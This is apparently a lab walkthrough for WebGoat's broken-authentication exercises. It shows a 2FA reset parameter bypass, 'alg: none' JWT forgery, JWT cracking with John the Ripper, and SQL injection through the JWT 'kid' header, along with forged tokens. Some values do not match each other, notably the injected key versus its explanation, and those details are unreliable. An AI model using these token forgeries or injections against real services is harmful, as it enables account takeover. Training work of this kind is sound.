# Broken Authentication

## Authentication Bypasses

2FA Password Reset

`secQuestion0[]=name1&secQuestion1[]=name2&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746`

## JWT Tokens

### Decoding a JWT token

Put token to [jwt.io](https://jwt.io) to decode it and get the user.

### JWT signing

Checking the reset votes function, we see that only admin can do that. Login as Tom and get the JWT token from cookies:
`eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NDA0NDUxOTAsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.Iiv_jzi_5KZfT_jNiWCb8KJGwAH-Y56rQlikaH_dmKFvDF2tUqUvevbkWl9Z67TMl5iS2cnMMu4dYoOr713qBw`
Decode the token:

```JSON
Header:
{
  "alg": "HS512"
}

Payload:
{
  "iat": 1586160355,
  "admin": "false",
  "user": "Tom"
}

Signature:
dsugXZYLM8WnyzWAA-CFOXCAzfVn0DwzrlmeY6Bns-Uce9Ez3IMq4SSLbk1YgQWNeg7kchjL9wUIqo6nVg8Sfg
```

Change "alg" to "none" and "admin" to "true" to remove the signature and pass the condition.

```JSON
Header:
{
  "alg": "none"
}

Payload:
{
  "iat": 1586160355,
  "admin": "true",
  "user": "Tom"
}
```

Encode to Base64 and concatenate to submit the new token to the server.
`ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNjQwNDQ1MTkwLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.`

### JWT cracking

Brute force signature, change the payload, sign again and submit it.
i'm using john the ripper: `john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`.

### Refreshing a token

We can solve by taking Tom's token from log, encode and change the exp time in the payload and alg to "none" in the header of the token, decode each part, concatenate it and submit the new token in "Authorization" header.
New token: `eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTY4Njc2NTgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.`

### Final challenge

Decoding JWT from deleleting Tom's account action, we can see some information:

```JSON
Header:
{
  "typ": "JWT",
  "kid": "webgoat_key",
  "alg": "HS256"
}

Payload:
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

In token's header, we can see `kid` (key ID).
Reference:
-`https://stackoverflow.com/questions/43867440/whats-the-meaning-of-the-kid-claim-in-a-jwt-token`
-`https://self-issued.info/docs/draft-jones-json-web-token-01.html#ReservedHeaderParameterName`

So, we can try with SQL injection to change the key ID to, for example, `something`.

```JSON
Header:
{
  "typ": "JWT",
  "kid": "webgoat_key' UNION SELECT 'bXlrZXk=' FROM INFORMATION_SCHEMA.TABLES -- ",
  "alg": "HS256"
}
```

- `c29tZXRoaW5n` is `something` encoded in Base64
- `INFORMATION_SCHEMA.TABLES` is just a  table we know that exists, to return valid query

```JSON
Payload:
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Tom",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

- Change username to `Tom`

And finally, sign with `something`:

```JWT
eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleScgVU5JT04gU0VMRUNUICdjMjl0WlhSb2FXNW4nIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlRBQkxFUyAtLSAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTk5OTk5OTk5OSwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.pumbmEnQdqHju1kM4NwVz6BUpQSj9Snn1hM58UYnZ8E
```

Changing request with new token and send again.
